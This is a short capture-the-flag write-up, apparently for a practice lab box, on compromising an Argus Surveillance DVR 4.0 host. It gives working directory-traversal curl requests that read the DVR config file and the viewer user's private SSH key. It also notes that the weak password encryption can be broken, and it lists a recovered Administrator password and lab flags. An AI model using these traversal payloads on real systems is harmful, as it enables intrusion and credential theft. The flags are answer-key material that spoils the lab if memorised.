# DVR4 \[Inter]

## Report

Argus Surveillance DVR Version: 4.0 is vulnerable to directory traversal and weak password encryption, use the former to read private SSH keys of user 'viewer' and the latter to read the encrypted password of Administrator.

## Enumeration

192.168.171.179

```
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           Bitvise WinSSHD 8.48 (FlowSsh 8.48; protocol 2.0; non-commercial use)
| ssh-hostkey: 
|   3072 21:25:f0:53:b4:99:0f:34:de:2d:ca:bc:5d:fe:20:ce (RSA)
|_  384 e7:96:f3:6a:d8:92:07:5a:bf:37:06:86:0a:31:73:19 (ECDSA)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8080/tcp  open  http-proxy
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Argus Surveillance DVR
|_http-generator: Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]
```

### Files

`C:\programdata\PY_Software\Argus Surveillance DVR\DVRParams.ini`

We didn't get the ride via directory traversal but once we got the shell it just had to be.\
In the curl request, the entire contents don't get displayed probably due to an output limit

### Initial Foothold

#### 80

Argus Surveillance Version: 4.0

{% embed url="https://www.exploit-db.com/exploits/50130" %}
crack hashed password
{% endembed %}

{% code title=" 2018-15745 Directory Traversal" %}
```
curl "http://192.168.171.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FProgramData%2FPY_Software%2FArgus%20Surveillance%20DVR%2FDVRParams.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
[Main]
ServerName=
ServerLocation=
ServerDescription=
ReadH=0
UseDialUp=0
DialUpConName=
DialUpDisconnectWhenDone=0
DIALUPUSEDEFAULTS" checked checked
```
{% endcode %}

The file which was supposed to have the password file didn't, try to get SSH keys after checking users registered - see Administrator and Viewer

```
http://192.168.171.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FViewer%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=
ssh -i id_rsa viewer@192.168.171.179
```

## PrivEsc

WinPEAS and PoweUp.ps1 didn't give us much - the mono output also made it real difficult

Read the  `DVRParams.ini` file again, this will have the password and decrypt using the CVE

## Loot

### Creds

SSH key for 'viewer'

`Administrator:14WatchD0g$`

### Flags

Local - 662ec009092c8c1c625bc738a92caf92

Proof - 26e7282a91e240b844abf0b150b7b7cb

## Proof

Don't be a one read QB, look past the blitz come on you got this
